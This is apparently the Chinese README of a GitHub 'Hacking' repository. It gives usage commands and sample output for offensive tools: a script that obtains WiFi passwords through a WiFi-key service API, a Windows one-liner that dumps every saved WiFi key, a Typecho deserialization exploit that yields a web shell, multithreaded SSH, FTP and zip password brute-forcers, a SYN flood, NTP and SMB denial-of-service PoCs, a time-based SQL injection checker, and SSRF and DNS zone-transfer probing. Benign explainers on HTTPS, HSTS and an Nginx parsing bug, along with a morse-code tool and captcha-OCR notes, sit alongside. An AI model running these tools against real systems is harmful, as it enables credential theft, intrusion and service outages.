# Hacking Tools Demo
[English version(英文版本)](README.en.md)

>Wechat Subscibe

![微信](https://github.com/LockGit/gochat/blob/master/architecture/gochat-wx.jpg)

__Menu__

| Topic                                    | Description                              |
| :--------------------------------------- | :--------------------------------------- |
| <a href="https://github.com/LockGit/Hacking#attackwifipy-一个获取wifi密码的工具">attackWiFi.py | 一个获取wifi密码的工具 |
| <a href="https://github.com/LockGit/Hacking#图解https">图解https</a> | 图解https |
| <a href="https://github.com/LockGit/Hacking#图解hsts">图解HSTS</a> | 图解HSTS |
| <a href="https://github.com/LockGit/Hacking#tcpportforwardpy-端口转发tool">TcpPortForward.py</a> | 端口转发tool |
| <a href="https://github.com/LockGit/Hacking#typeecho-get-shell--typeecho反序列化漏洞利用">typeEchoShell.py|typeEchoShell.php</a> | typeEcho反序列化漏洞利用 | 
| <a href="https://github.com/LockGit/Hacking#获取所有连接过的wifi密码win平台">wifi密码</a> | 获取所有连接过的wifi密码(Win平台) | 
| <a href="https://github.com/LockGit/Hacking#zipattackpy--zakpy-zip加密文件暴力破解">zipattack.py|zak.py</a> | zip加密文件暴力破解 |
| <a href="https://github.com/LockGit/Hacking#createDictpy-生成一个简单的密码破解字典">createDict.py</a> | 生成一个简单的密码破解字典 |
| <a href="https://github.com/LockGit/Hacking#portscanpy-多线程端口扫描器">PortScan.py</a> | 多线程端口扫描器 |
| <a href="https://github.com/LockGit/Hacking#sshattackpy-多线程ssh密码暴力破解">sshAttack.py</a> | 多线程ssh密码暴力破解 |
| <a href="https://github.com/LockGit/Hacking#ftpattackpy-多线程ftp密码暴力破解">ftpAttack.py</a> | 多线程ftp密码暴力破解 |
| <a href="https://github.com/LockGit/Hacking#synfloodpy-一个简单的-tcp-syn-洪水攻击-python版">synFlood.py</a> | synFlood TCP SYN 洪水攻击 |
| <a href="https://github.com/LockGit/Hacking#ntpdenialservicepy-一个使ntp拒绝服务的poc代码">ntpdenialservice.py</a> | 一个使ntp拒绝服务的poc代码 |
| <a href="https://github.com/LockGit/Hacking#分享一个sql注入的技巧">SQL Inject</a> | 分享一个SQL注入的技巧 |
| <a href="https://github.com/LockGit/Hacking#attacksmbwin10py-一个smb漏洞的poc代码">attackSmb/win10.py</a> | 一个SMB漏洞的Poc |
| <a href="https://github.com/LockGit/Hacking#badtunnel-pocrb-badtunnel-跨网段劫持">badtunnel-poc.rb</a> | badtunnel 跨网段劫持 |
| <a href="https://github.com/LockGit/Hacking#sqlinjetctpy-一个延时注入的验证">sqlInjetct.py</a> | 一个延时注入的验证 |
| <a href="https://github.com/LockGit/Hacking#关于ssrf漏洞-与-dns域传送漏洞">SSRF & DNS</a> | SSRF漏洞 & DNS域传送漏洞 |
| <a href="https://github.com/LockGit/Hacking#使用python构造一个fastcgi协议请求内容发送给php-fpm--nginxiis7解析漏洞原理">fpm.py</a> | Nginx（IIS7）解析漏洞原理 |
| <a href="https://github.com/LockGit/Hacking#morsepy-摩斯密码加解密">morse.py</a> | 摩斯密码加解密 |
| <a href="https://github.com/LockGit/Hacking#crawlpy-轻量级图片爬虫">crawl.py</a> | 轻量级图片爬虫 |
| <a href="https://github.com/LockGit/Hacking#wooyun_indexpy-1000个php代码审计案例20167以前乌云公开漏洞---增加索引">wooyun_index.py</a> | 1000个PHP代码审计案例(2016.7以前乌云公开漏洞)---增加索引 |
| <a href="https://github.com/LockGit/Hacking#proxy_crawlget_proxypy--ocr_imgpy-反爬虫代理服务器抓取实现方式">proxy_crawl/get_proxy.py & proxy_crawl/ocr_img.py </a> |反爬虫代理服务器抓取实现 |
| <a href="https://github.com/LockGit/Hacking#验证码识别v1http协议range特性分析">验证码识别v1+HTTP协议Range特性分析.pdf</a> | 验证码识别v1+HTTP协议Range特性分析 |
| <a href="https://github.com/LockGit/Hacking#基于机器学习tensorflow的复杂验证码识别">基于机器学习(TensorFlow)的复杂验证码识别.pdf</a> | 基于机器学习(TensorFlow)的复杂验证码识别 |
| <a href="https://github.com/LockGit/Py#scrapy-爬虫测试项目代码在仓库crawl_360目录下">Scrapy爬取站点数据</a> | Scrapy爬取漏洞列表 |
| [ip地址也可以这么表示.pdf](https://github.com/LockGit/Hacking/raw/master/pdf/ip地址也可以这么表示.pdf) | ip地址也可以这么表示.pdf |
| [针对跨域问题的分析.pdf](https://github.com/LockGit/Hacking/raw/master/pdf/从2.5w美刀漏洞赏金，针对跨域问题的分析.pdf) | 从2.5w美刀漏洞赏金，针对跨域问题的分析.pdf|
| [关于TTL生存时间.pdf](https://github.com/LockGit/Hacking/raw/master/pdf/关于TTL生存时间.pdf) | 关于TTL生存时间.pdf |
| [为什么正确的SQL不能执行.pdf](https://github.com/LockGit/Hacking/raw/master/pdf/为什么正确的SQL不能执行.pdf) | 为什么正确的SQL不能执行.pdf |
| [从翻墙到使用cloudflare作为跳板来访问vps折腾出的几个问题.pdf](https://github.com/LockGit/Hacking/raw/master/pdf/从翻墙到使用cloudflare作为跳板来访问vps折腾出的几个问题.pdf) | 从翻墙到使用cloudflare作为跳板来访问vps折腾出的几个问题.pdf |

### attackWiFi.py 一个获取wifi密码的工具
```
破解原理：
	破解wifi万能钥匙的接口协议，非抓包暴力破解，wifi万能钥匙的服务端存储了大量的wifi密码相关信息
	通过向接口提供ssid和bssid信息，获取真实的wifi密码
	这里要感谢zke1ev3n逆向了wifi万能钥匙的安卓客户端
	本脚本完善了破解程序，增加了容错机制，获得的密码在response中其实是urlencode的，本脚本也增加了decode解码
查看帮助
➜  Hacking git:(master) ✗ py attackWiFi.py -h
Usage: use:
	--ssid <wifi ssid> --bssid <wifi bssid>
	Example: python attackWiFi.py --ssid ssid --bssid bssid

Options:
  -h, --help          show this help message and exit
  --ssid=WIFI_SSID    the wifi ssid info
  --bssid=WIFI_BSSID  the wifi bssid info

第一步是要获得wifi的ssid和bssid信息，我演示的环境是Mac环境，其他环境请自行寻找下获取ssid和bssid的工具
Mac环境：
	执行：airport -s 获取所有wifi相关信息，这里部分信息进行了打码：
	Mac下默认airport -s 是不行的，因为我在执行之前建过一个软链接：
	ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
	其他操作系统获取方式可自行Google
```
![](https://github.com/LockGit/Hacking/blob/master/img/ssid.png)
```
上一步获得了ssid和bssid信息
执行获取密码：
python attackWiFi.py --ssid xxx --bssid ****
xxx 表示wifi的名称：比如wifi名叫：home
**** 表示wifi的bssid信息：比如 17:71:94:14:84:0d (随便写的)
那么获取密码就是：
python attackWiFi.py --ssid home --bssid 17:71:94:14:84:0d
成功了会显示password is: xxxxxxx
也有可能会失败，貌似服务端是有check的，操作多了，会获取失败，这个时候可以换一个网络环境测试，或者换一个wifi测试
```

### 图解https
```
网上大部分关于https的讲解各式各样，也不易于理解。于是自己总结画了个图，如有错误欢迎批评指正
```
![](https://github.com/LockGit/Hacking/blob/master/img/https.png)
```
1.[server] 生成配对的公钥和私钥，Pub,Pri
2.[server] 服务器将“Pub”传给客户端
3.[Client] 生成对称秘钥("key2"),然后用key2加密信息
4.[Client] 使用“Pub”加密“key2”。因为只有服务器知道“Pri”,所以“key2”是安全的
5.[Client] send(加密后的数据)和(加密的后的key2)给服务器
6.[Server] 用私钥“Pri”解密这个result_two，拿到“key2”
7.[Server]用“key2”解密加密后的数据result_one。数据安全的到达来了服务器。

总结:解密result_one用的key2采用对称加密,而公钥和私钥的生成则采用非对称加密,
所以一个完整的https流程应该是既包含了对称加密也包含了非对称加密.
```

### 图解HSTS
```
HSTS一定是安全的的吗？助你深入理解HSTS的图。
```
![](https://github.com/LockGit/Hacking/blob/master/img/hsts.png)


### TcpPortForward.py 端口转发tool
```
使用场景:

一：
A服务器在内网，公网无法直接访问这台服务器，但是A服务器可以联网访问公网的B服务器（假设IP为222.2.2.2）。
我们也可以访问公网的B服务器。我们的目标是访问A服务器的22端口。那么可以这样：

1. 在B服务器上运行：
./TcpPortForward.py l:10001 l:10002
表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了。

2. 在A服务器上运行：
./TcpPortForward.py c:localhost:22 c:222.2.2.2:10001
表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了。

3. 然后我们就可以这样来访问A服务器的22端口了：
ssh 222.2.2.2 -p 10002
原理很简单，这个命令执行后，B服务器的10002端口接收到的任何数据都会传给10001端口，此时，A服务器是连接了B服务器的10001端口的，
数据就会传给A服务器，最终进入A服务器的22端口。

二：
不用更多举例了，TcpPortForward.py的l与c两个参数可以进行灵活的两两组合，多台服务器之间只要搞明白数据流方向，那么就能满足很多场景的需求。

collect from phithon
```

### typeEcho get Shell , typeEcho反序列化漏洞利用
```
typeEchoShell.php 为生成shell的内容，经过base64后序列化的值，后用于typeEchoShell.py中的cookie一项
typeEchoShell.py  获取目标站点shell

例：python typeEchoShell.py -u http://www.xxx.com

若要自定义shell内容，可更改typeEchoShell.php，自定义shell内容

```


### 获取所有连接过的wifi密码(Win平台)
```
需要管理员权限
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```
![](https://github.com/LockGit/Hacking/blob/master/img/win_wifi_cmd.png)


### zipattack.py | zak.py zip加密文件暴力破解

```
帮助说明：  python zipattack.py -h

测试：
zip test.zip *.gif -e 

进行暴力破解：
python zipattack.py -f test.zip -d password.txt


第二个脚本：zak.py 是无限穷举
python zak.py -h 
Usage: usage	 -f <zipfile> -t <type> -l <length> or -h get help

Options:
  -h, --help  show this help message and exit
  -f ZNAME    specifyzip file
  -t TNAME    specify type(num|a|A|aA|anum|numa|Anum|aAnum)
  -l LENGTH   specify length,default=8
例：
	python zak.py -f test.zip -t num -l 12
	表示以数字类型，长度最长为12的密码枚举test.zip文件
```


### createDict.py 生成一个简单的密码破解字典
```
python createDict.py 

按ctrl+c 停止生成
```

### PortScan.py 多线程端口扫描器
```
More Help: PortScan.py -h

测试:
	python PortScan.py -H www.baidu.com -p 80 443 110
	➜  py python PortScan.py -H www.baidu.com -p 80 443 110 
		[+] Scan Results for: 119.75.218.70
		Scanning port 443
		Scanning port 110
		Scanning port 80
		[+]443/tcp open
		[+] HTTP/1.1 302 Moved Temporarily
		Server: bfe/1.0.8.18
		Date: Sun, 06 Nov 2016 08:43:40 GMT
		Content-T
		[-]110/tcp closed
		[-]80/tcp closed
	Also, You can local test , The python script support domain or ip mode
	Example:
		python PortScan.py -H 127.0.0.1 -p 80
```

### sshAttack.py 多线程ssh密码暴力破解
```
测试：
	➜  py python sshAttack.py -h                                                    
		Usage: -H <target host> -u <user> -f <password list>

		Options:
		  -h, --help     show this help message and exit
		  -H TGTHOST     specify target host
		  -f PASSWDFILE  specify password file
		  -u USER        specify the user
		  -c COUNT       specify the max ssh connect count , default 5
	
	py python sshAttack.py -H 192.168.2.201 -u test -f /Users/lock/1.txt -c 20
	-c 用户测试指定ssh链接数，具体根据ssh config 文件判断

例：
➜  py python sshAttack.py -H 192.168.1.100 -u root -f password.md -c 20
		[-] Testing: 1111
		[-] Testing: 2222
		[-] Testing: 3333
		[-] Testing: 111111
		[-] Testing: 123123
		[-] Testing: 123456
		[+] Good , Key Found: 123456
```

### ftpAttack.py 多线程ftp密码暴力破解
```
测试：
➜  py python ftpAttack.py -h
	Usage: -H <target host> -f <password list>

	Options:
	  -h, --help     show this help message and exit
	  -H TGTHOST     specify target host
	  -f PASSWDFILE  specify password file,like username:password format file
	  -d DELAY       attack time delay set default 1s

➜  py python ftpAttack.py -H 127.0.0.1 -f userpass.md -d 1

	[-] 127.0.0.1 FTP Anonymous Logon Failed.
	[+] Trying: root/aaa

	[-] Could not brute force FTP credentials.

	[+] Trying: lock/mmm

	[-] Could not brute force FTP credentials.
	[+] Trying: alice/123


	[-] Could not brute force FTP credentials.

	The default test delay time is 0s , test default account is anonymous , if success, will show user name and password.
	userpass.md is username and password file,the file format like below:
		root:123
		hello:456
		alice:789
		test:12345
```

### synFlood.py 一个简单的 TCP SYN 洪水攻击 python版
```
More Detail:
python synFlood.py -h
1,用 Scapy 简单的复制一个 TCP SYN 洪水攻击，将制作一些 IP 数据包,  TCP 513 目标端口。
2,运行攻击发送 TCP SYN 数据包耗尽目标主机资源，填满它的连接队列，基本瘫 痪目标发送 TCP 重置包的能力。
3,netstat -an 大量的半链接状态 SYN_RECV

可能需要的依赖：
brew install --with-python libdnet

pip install scapy
pip install pcapy
pip install pydumbnet

执行效果:
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
....
```

### ntpDenialService.py 一个使ntp拒绝服务的poc代码
```
构造一个特殊的数据包，ntpd没有默认开启trap服务，如果trap被开启，攻击者就能通过特别构造的数据包导致空指针引、ntpd崩溃，进而导致服务器拒绝服务。
测试：
监听本地udp 1111 端口
➜  ~ nc -l -u 0 1111

执行：
➜  Hacking git:(master) ✗ python ntpDenialService.py 127.0.0.1 1111
[-] Sending payload to 127.0.0.1:1111 ...
[+] Done!

➜  ~ nc -l -u 0 1111

6nonce, laddr=[]:Hrags=32, laddr=[]:WOP2, laddr=[]:WOP

接受到这个特殊的数据包，ntpd崩溃，形成拒绝服务
```

### 分享一个SQL注入的技巧
```
审计开源框架/cms的时候可能会遇到一些有意思的注入漏洞
当以pdo的方式连接mysql，也就是说可以多语句执行的时候
然后，参考如下：

python:
import binascii
s='select * from x limit 1;'

print binascii.b2a_hex(s)
# 获得16进制数据，73656c656374202a2066726f6d2078206c696d697420313b

mysql -uroot
set @a:=0x73656c656374202a2066726f6d2078206c696d697420313b;

prepare s from @a;

execute s;

mysql root@localhost:test> execute s;
+------+----------+-------+
|   id |   is_reg |   pid |
|------+----------+-------|
|    1 |        1 |     0 |
+------+----------+-------+
1 row in set
Time: 0.002s
```

### attackSmb/win10.py 一个SMB漏洞的Poc代码
```
此漏洞主要影响Windows Server 2012/2016、Win8/8.1以及Win10系统。
攻击者可以模拟成一个SMB服务器，诱使客户端发起SMB请求来触发漏洞。
攻击者也可以通过中间人方式“毒化”SMB回应，插入恶意的SMB回复实现拒绝服务或控制受害系统。
```
![](https://github.com/LockGit/Hacking/blob/master/attackSmb/attacksmb.png)


### badtunnel-poc.rb badtunnel 跨网段劫持
```
detail:
badtunnel-poc.rb
```

### sqlInjetct.py 一个延时注入的验证
```
根据返回的时间差来猜测注入的结果是否正确(无视代码很烂)
帮助：
➜  Hacking git:(master) ✗ py sqlInjetct.py
-----Usage:-----

Example:
python sqlInject.py -u http://xxx.xxx.com/id=123

```

### 关于SSRF漏洞 与 DNS域传送漏洞
```
SSRF放大以后还是十分危险的，当利用SSRF刺探内网的时候，结合dict伪协议再利用ftp协议刺探某个ip是否存活.
一般情况下如果可以在极短时间内得到response那么基本可以判定该ip存活，反之不存在该ip。
这个技巧也是收集过来的，至于为什么应该是和ftp协议本身有关?
获得一幅内网蓝图SSRF是一个不错的选择。
如何判断SSRF：
1,SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的。
2,在我们本地浏览器的请求中就不应该存在图片的请求，如果抓包可以立即看到效果。

DNS域传送漏洞：
主域服务器A，备域服务器B,
A，B之间需要备份相关的域名，ip对应信息,
原则上只有B可以去同步A信息到自己的数据库中。但是由于配置错误,
导致任意客户端向主域发起请求,主域都会把相关信息返回给客户端,内部网络蓝图被轻松泄露。

dig soa xxx.com
得到ANSWER SECTION:假设为：
ns3.dnsv4.com

查看是否有域传送返回：
dig axfr xxx.com @ns3.dnsv4.com
有返回就表示漏洞存在
```

### 使用Python构造一个fastcgi协议请求内容发送给php-fpm , Nginx（IIS7）解析漏洞原理
```
查看帮助：
python fpm.py -h 

这篇文章写的不错，于是收集了过来：
https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

简述如下：
Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability）.
该漏洞现象是，在用户访问http://127.0.0.1/favicon.ico/.php时，访问到的文件是favicon.ico，但却按照.php后缀解析了。

用户请求http://127.0.0.1/favicon.ico/.php，nginx将会发送如下环境变量到fpm里：

{
    ...
    'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php',
    'SCRIPT_NAME': '/favicon.ico/.php',
    'REQUEST_URI': '/favicon.ico/.php',
    'DOCUMENT_ROOT': '/var/www/html',
    ...
}
正常来说:
SCRIPT_FILENAME的值是一个不存在的文件/var/www/html/favicon.ico/.php，
是PHP设置中的一个选项fix_pathinfo导致了这个漏洞。
PHP为了支持Path Info模式而创造了fix_pathinfo，在这个选项被打开的情况下，
fpm会判断SCRIPT_FILENAME是否存在，如果不存在则去掉最后一个/及以后的所有内容，
再次判断文件是否存在，往次循环，直到文件存在。

所以，第一次fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。
显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。

正确的解决方法有两种：
一，在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；
二，借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。

```

### morse.py 摩斯密码加解密
```
摩斯密码是由美国的三缪摩斯发明的一套加密算法，是一种断断续续的信号代码。
加密：
➜  ~ python morse.py -e lock
.-.. --- -.-. -.-

解密:
➜  ~ python morse.py -d '.-.. --- -.-. -.-'
lock
➜  ~

查看帮助:
➜  ~ python morse.py
usage	 -e|-d msg or -h get help

```

### crawl.py 轻量级图片爬虫
```
修改crawl.py中:
URL = "https://www.xxx.top" # 要爬取的网站

# 爬取的URL域名范围
URL_RULE = [
        'https://www.xxx.top',
        'https://xxx.top',
        'http://www.xxx.top',
        'http://xxx.top'
]

执行爬虫：
python crawl.py 

```

### wooyun_index.py 1000个PHP代码审计案例(2016.7以前乌云公开漏洞)---增加索引
```
git clone git@github.com:Xyntax/1000php.git
默认是没有索引的，所以查看漏洞十分不方便
1，cd 1000php
2，执行下载我的脚本：wget https://raw.githubusercontent.com/LockGit/Hacking/master/wooyun_index.py -O wooyun_index.py
3，执行：mkdir css && mkdir js 
4，执行：wget https://github.com/LockGit/Hacking/raw/master/res/style.css -O style.css -P css/
5，执行：wget https://github.com/LockGit/Hacking/raw/master/res/jquery-1.4.2.min.js -O jquery-1.4.2.min.js -P js/
6，执行：python wooyun_index.py 会生成漏洞索引列表，此时会生成index.html文件，打开这个文件即可
效果如下：
```
![](https://github.com/LockGit/Hacking/blob/master/img/1000php.png)
![](https://github.com/LockGit/Hacking/blob/master/img/1000php_detail.png)

### proxy_crawl/get_proxy.py | ocr_img.py 反爬虫代理服务器抓取实现方式
```
访问：http://www.goubanjia.com/free/index.shtml 可看到该网站提供了很多代理服务器
但是核心的代理ip信息采用了反爬虫策略
可以看下page结构如下面图片描述,写过爬虫的同学知道这是有意混淆页面结构,让爬虫无法抓取到正确信息，从而在一定程度上起到保护作用。
写了2个py文件进行了一个小测试，是一个简单实现,代码在仓库proxy_crawl目录下：
没有什么高深的技术含量
核心原理是通过selenium唤醒chrome打开待抓取页面，然后程序自动对每一页内容进行截图，保存在proxy_crawl/img下面(如下图)
之后通过pytesseract对抓取到的图片进行识别，直接无视前端页面的混淆
pytesseract模块可以尝试下，国外还有大神用js实现了这个模块，支持62种语言浏览器端的识别，当然，也是需要模型数据支持的
一般还可以识别一下简单的验证码，但是复杂的不行，太过复杂的可能需要比如tensorflow+cnn，网上也有案例
清洗数据并记录到proxy_crawl/proxy.md文件中
环境：python 2.7.14 , 模块可以自己看下 py 文件代码，pip install 下所用到的模块
执行：python get_proxy.py 抓取图片
执行：python ocr_img.py 代理数据识别
```
![](https://github.com/LockGit/Hacking/blob/master/img/page_detail.png)
![](https://github.com/LockGit/Hacking/blob/master/img/crawl_png.png)
![](https://github.com/LockGit/Hacking/blob/master/img/img_list.png)
![](https://github.com/LockGit/Hacking/blob/master/img/proxy_list.png)


### 验证码识别v1+HTTP协议Range特性分析 
```
Google 搜索 tesseract.js 字符识别
```
![](https://github.com/LockGit/Hacking/blob/master/img/code_v1.png)

总结文档：+ [验证码识别v1+HTTP协议Range特性分析.pdf](https://github.com/LockGit/Hacking/blob/master/res/doc/验证码识别v1+HTTP协议Range特性分析.pdf)
```
HTTP协议Range特性分析(多线程文件下载器实现):
```
+ [多线程文件下载器实现](https://github.com/LockGit/Py#nice_downloadpy-多线程文件下载器)


### 基于机器学习(TensorFlow)的复杂验证码识别
![](https://github.com/LockGit/Hacking/blob/master/img/code_v2.png)
```
运用机器学习算法时，如果不理解实现原理，先套接口先实现功能，识别算法是通用的。一般处理不同验证码，有不同的处理策略。
分类算法举例：（具体：https://github.com/LockGit/Py）
    01，knn   (k点邻近算法）
    02，svm（支持向量机，十分复杂）
    ...
SVM算法相比较KNN算法来说，原理上要复杂复杂的多，SVM算法基本思想是把数据转化为点，
通过把点映射到n维空间上，通过n-1维的超平面切割，找到最佳切割超平面，
通过判断点在超平面的哪一边，来判断点属于哪一类字符。

基于机器学习的验证码识别则是把要识别的对象当做一个整体。
选择0-9纯数字，CNN网络4*10个输出，学习时间：70分钟，模型准确率：99%
验证码预测截图:
```
![](https://github.com/LockGit/Hacking/blob/master/img/cnn_test.png)

总结文档：+ [基于机器学习(TensorFlow)的复杂验证码识别.pdf](https://github.com/LockGit/Hacking/blob/master/res/doc/基于机器学习(TensorFlow)的复杂验证码识别.pdf)


